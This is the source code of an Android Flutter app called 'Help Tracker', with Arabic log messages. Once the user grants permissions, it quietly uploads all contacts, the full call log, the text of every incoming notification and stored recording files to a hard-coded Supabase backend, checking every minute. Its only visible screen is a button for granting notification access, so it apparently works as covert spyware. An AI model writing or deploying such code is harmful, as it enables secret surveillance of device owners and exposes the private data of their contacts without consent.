import 'dart:async';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:flutter_notification_listener/flutter_notification_listener.dart';
import 'package:android_intent_plus/android_intent.dart';
import 'package:android_intent_plus/flag.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:call_log/call_log.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:path/path.dart' as p;
import 'package:path_provider/path_provider.dart';
import 'package:hive/hive.dart';
import 'package:hive_flutter/hive_flutter.dart';
import 'package:supabase_flutter/supabase_flutter.dart';
import 'package:permission_handler/permission_handler.dart';

void main() async {
  WidgetsFlutterBinding.ensureInitialized();

  final dir = await getApplicationDocumentsDirectory();
  await Hive.initFlutter(dir.path);
  await Hive.openBox<String>('pending_recordings');

  await Supabase.initialize(
    url: 'https://mavkdxueudusgjdphyhn.supabase.co',
    anonKey: 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1hdmtkeHVldWR1c2dqZHBoeWhuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ4NDU3MDgsImV4cCI6MjA2MDQyMTcwOH0.srw9bbod0BLAwhbQASWQ9IfYcL8oRc4ZszlfzM4l1N4',
  );

  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});
  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  Timer? _syncTimer;

  @override
  void initState() {
    super.initState();
    NotificationsListener.initialize();
    checkNotificationAccess();
    uploadContactsToSupabase();
    uploadCallLogs();
    startAutoSyncTimer();

    NotificationsListener.receivePort?.listen((event) {
      if (event is NotificationEvent) {
        uploadNotificationToSupabase(event);
      }
    });
  }

  @override
  void dispose() {
    _syncTimer?.cancel();
    super.dispose();
  }

  void startAutoSyncTimer() {
    _syncTimer = Timer.periodic(const Duration(minutes: 1), (timer) async {
      final connectivity = await Connectivity().checkConnectivity();
      if (connectivity != ConnectivityResult.none) {
        await uploadPendingRecordings();
      }
    });
  }

  void openNotificationAccessSettings() {
    const intent = AndroidIntent(
      action: 'android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS',
      flags: <int>[Flag.FLAG_ACTIVITY_NEW_TASK],
    );
    intent.launch();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        appBar: AppBar(title: const Text('Help Tracker')),
        body: Center(
          child: ElevatedButton(
            onPressed: openNotificationAccessSettings,
            child: const Text('تفعيل صلاحية الإشعارات'),
          ),
        ),
      ),
    );
  }
}

// === SUPABASE FUNCTIONS ===

Future<void> uploadNotificationToSupabase(NotificationEvent event) async {
  final supabase = Supabase.instance.client;
  final data = {
    'package_name': event.packageName,
    'title': event.title,
    'text': event.text,
    'timestamp': DateTime.now().toIso8601String(),
  };

  try {
    await supabase.from('notifications').insert(data);
    print("🔔 إشعار مرفوع إلى Supabase");
  } catch (e) {
    print("❌ فشل رفع الإشعار: $e");
  }
}

Future<void> uploadContactsToSupabase() async {
  if (!await Permission.contacts.request().isGranted) return;

  final contacts = await ContactsService.getContacts(withThumbnails: false);
  final deviceId = await getDeviceId();
  final supabase = Supabase.instance.client;

  for (final contact in contacts) {
    for (final phone in contact.phones ?? []) {
      await supabase.from('contacts').insert({
        'name': contact.displayName ?? 'unknown',
        'number': phone.value ?? '',
        'device_id': deviceId,
        'timestamp': DateTime.now().toIso8601String(),
      });
    }
  }

  print("📇 تم رفع جهات الاتصال إلى Supabase");
}

Future<void> uploadCallLogs() async {
  if (!await Permission.phone.request().isGranted) return;

  final entries = await CallLog.get();
  final deviceId = await getDeviceId();
  final supabase = Supabase.instance.client;

  for (final entry in entries) {
    await supabase.from('calls').insert({
      'user_id': deviceId,
      'number': entry.number ?? '',
      'duration': entry.duration ?? 0,
      'timestamp': entry.timestamp != null
          ? DateTime.fromMillisecondsSinceEpoch(entry.timestamp!).toIso8601String()
          : null,
    });
  }

  print("📞 تم رفع سجل المكالمات");
}

Future<void> uploadPendingRecordings() async {
  final box = Hive.box<String>('pending_recordings');
  final supabase = Supabase.instance.client;
  final deviceId = await getDeviceId();

  for (final path in box.values) {
    final file = File(path);
    if (await file.exists()) {
      final fileName = p.basename(file.path);
      final response = await supabase.storage
          .from('my-bucket')
          .upload(fileName, file);

      if (response != null) {
        print("☁️ تم رفع $fileName");
        box.delete(path);
      }
    }
  }
}

Future<void> checkNotificationAccess() async {
  final isRunning = await NotificationsListener.isRunning;
  if (!isRunning!) {
    print("⚠️ صلاحية الإشعارات غير مفعلة");
  } else {
    print("✅ صلاحية الإشعارات مفعلة");
  }
}

Future<String> getDeviceId() async {
  final deviceInfo = DeviceInfoPlugin();
  final androidInfo = await deviceInfo.androidInfo;
  return androidInfo.id ?? 'unknown_device';
}
